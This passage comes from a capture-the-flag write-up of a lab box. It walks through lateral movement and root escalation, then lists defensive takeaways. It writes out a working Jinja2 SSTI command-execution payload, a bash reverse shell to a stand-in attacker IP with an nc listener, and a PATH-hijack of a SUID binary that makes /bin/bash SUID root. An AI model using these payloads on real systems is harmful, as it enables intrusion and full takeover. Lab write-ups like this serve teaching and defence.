www-data@projectmanager:/app$ su andoni
Password:
andoni@projectmanager:/app$ cd
andoni@projectmanager:~$ cat user.txt
REDACTED
```

This is the foothold proper — `andoni` holds `user.txt`.

## Lateral Movement — `andoni` → `ander`

`andoni`'s home held a note pointing at an internal service:

```bash
andoni@projectmanager:~$ cat notes.txt
Recordatorio (andoni):
- El equipo de infraestructura (ander) dejo levantado un microservicio interno
  de informes que solo escucha en local (127.0.0.1). Revisar puertos abiertos:
      ss -tlnp     (o:  netstat -tlnp)
```

The listening sockets confirm three localhost-only services on top of the public ports:

```bash
andoni@projectmanager:~$ netstat -ntlp
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
```

`5432` is PostgreSQL, `8000` is the Django app, and `5000` is the report microservice. The process list attributes it to `ander`:

```bash
andoni@projectmanager:~$ ps -aux | grep meridian
ander         13  0.0  0.0  37464 31320 ?  S  10:56  0:00 /opt/venv/bin/python /opt/meridian-report/app.py
```

Since it binds to `127.0.0.1`, I tunnelled port 5000 out over SSH (using the `andoni` credential) to reach it from my browser:

```bash
ssh -L 5000:127.0.0.1:5000 andoni@172.30.0.10 -N
```

The service self-describes at the root:

```json
{
  "endpoints": {
    "/health": "estado del servicio",
    "/report": "genera un informe personalizado (parametros: name, period)"
  },
  "service": "Meridian Report Service",
  "version": "1.4.2"
}
```

### SSTI in the Report Endpoint

`/report` renders a status document and reflects the `name` parameter into it:

![Meridian Report Service rendering the default report](/assets/img/Custom/ProjectManager2/cap7.png)

{% raw %}
A Flask service that echoes user input into its output is a prime candidate for Server-Side Template Injection. Reflecting a Jinja2 expression rather than a literal is the tell — `{{7*7}}` came back evaluated:

```text
http://127.0.0.1:5000/report?name={{7*7}}
```

![SSTI confirmed: 7 times 7 evaluated to 49](/assets/img/Custom/ProjectManager2/cap8.png)

The report title read "Informe de estado — 49" — the template engine evaluated the expression, so this is Jinja2 SSTI. From there the usual escape to Python: reach an object's `__class__`, walk into a bound method's `__globals__` to grab `__builtins__`, and `__import__('os')` to run commands. Flask's `config` object is a convenient starting gadget. Wrapping it in a `{% with %}` block keeps the payload to a single reflected parameter:

```text
/report?name={% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() %}{{ a }}{% endwith %}
```

(URL-encoded in the querystring.) The rendered title carried the command output:

![SSTI RCE returning ander's id with sysadmin group membership](/assets/img/Custom/ProjectManager2/cap9.png)

```text
uid=1001(ander) gid=1002(ander) groups=1002(ander),1000(sysadmin)
```

The service runs as `ander`, who is a member of the `sysadmin` group. Swapping `id` for a reverse shell escalated the SSTI to an interactive session:

```text
/report?name={% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'").read() %}{{ a }}{% endwith %}
```
{% endraw %}

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.30.0.10 42468
bash: cannot set terminal process group (13): Inappropriate ioctl for device
bash: no job control in this shell
ander@projectmanager:/opt/meridian-report$
```

After the same TTY upgrade, `ander`'s home held the pointer to the privesc:

```bash
ander@projectmanager:~$ cat notes.txt
ander (grupo sysadmin):
- Mantenimiento dejo un comprobador de servicios: /usr/local/bin/syscheck
- Es SUID root. Ojo con COMO resuelve los comandos que ejecuta internamente...
```

## Privilege Escalation — `ander` → `root`

`ander`'s note names the vector directly, and the SUID sweep confirms it — a single non-standard SUID-root binary:

```bash
ander@projectmanager:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/syscheck
```

The note's warning — *watch HOW it resolves the commands it runs internally* — is the whole exploit. Inspecting the binary's strings shows what it executes:

```bash
ander@projectmanager:/usr/local/bin$ strings syscheck
[...]
setgid
setuid
system
[...]
[syscheck] comprobando estado de los servicios...
systemctl is-active ssh 2>/dev/null || service ssh status 2>/dev/null
```

The binary calls `setuid`/`setgid` (so it runs the child with root privileges) and then hands `systemctl is-active ssh ...` to `system()`. Critically, it invokes `systemctl` **by name, not by absolute path**. `system()` runs its argument through `/bin/sh -c`, which resolves `systemctl` against `$PATH`. Since the SUID binary never sanitizes `$PATH`, whichever `systemctl` appears first on the caller's `$PATH` is executed **as root** — a textbook PATH hijack.

The plan: drop a malicious `systemctl` in a writable directory, prepend that directory to `$PATH`, and run `syscheck`. The payload sets the SUID bit on `/bin/bash` so it can be re-entered as root afterwards:

```bash
ander@projectmanager:/tmp$ echo $PATH
/opt/venv/bin:/usr/bin:/bin

# Malicious systemctl earlier on PATH than the real one
ander@projectmanager:/tmp$ cat systemctl
chmod u+s /bin/bash

ander@projectmanager:/tmp$ chmod +x /tmp/systemctl
ander@projectmanager:/tmp$ export PATH=/tmp:$PATH
ander@projectmanager:/tmp$ cd /usr/local/bin/
ander@projectmanager:/usr/local/bin$ ./syscheck
ander@projectmanager:/usr/local/bin$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 May  7 20:33 /bin/bash
```

`/bin/bash` is now SUID root. Invoking it with `-p` preserves the effective UID instead of dropping privileges, giving a root shell:

```bash
ander@projectmanager:/tmp$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
REDACTED
```

Root.

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Anonymous FTP is an information-disclosure sink, not just a file share.** The `InformaticsTasks.txt` note pre-disclosed the framework version, the existence of a soft-hidden admin panel, and "hidden" API endpoints. Version disclosure alone (`Django 4.2`) was enough to select CVE-2025-64459 before touching the app.

- **`_connector` in Django's ORM is raw SQL when it reaches user input.** CVE-2025-64459 turns any endpoint that expands an attacker-controlled dictionary into `filter()`/`exclude()`/`get()` into a SQL injection point. A 200/401 status differential on the login endpoint was all that was needed to build a full boolean oracle and dump the schema without ever seeing an error message.

- **Unsalted SHA1 password storage collapses the moment the table leaks.** Once the `users` table was dumped, plain SHA1 hashes fell to rockyou instantly — a single staff account (`elisabeth`) was the pivot from unauthenticated SQLi to a superuser session.

- **Client-side "hiding" is not authorization.** The admin panel rendered for everyone and only gated its actions on a client-side check; the real control was the JWT's `staff`/`superuser` claims, which came for free once a staff account's password was cracked.

- **Credential reuse between service scripts and OS accounts is the most common Linux lateral-movement primitive.** A world-readable-to-`www-data` maintenance script hardcoded `andoni`'s password and even documented that it doubled as the SSH credential — reading one file was the entire pivot.

- **Localhost-only services expand the attack surface after a foothold, not before.** The Jinja2 report service was invisible from the network; only after landing on the box and forwarding port 5000 did the SSTI (and the jump to a second user) become reachable.

- **A SUID binary that calls `system()` with a bare command name is a PATH hijack waiting to happen.** `syscheck` never sanitized `$PATH` before invoking `systemctl`, so a one-line attacker-controlled `systemctl` earlier on `$PATH` ran as root. When auditing SUID binaries, `strings` plus a check for absolute paths in the executed commands is the fastest way to spot this class of bug.
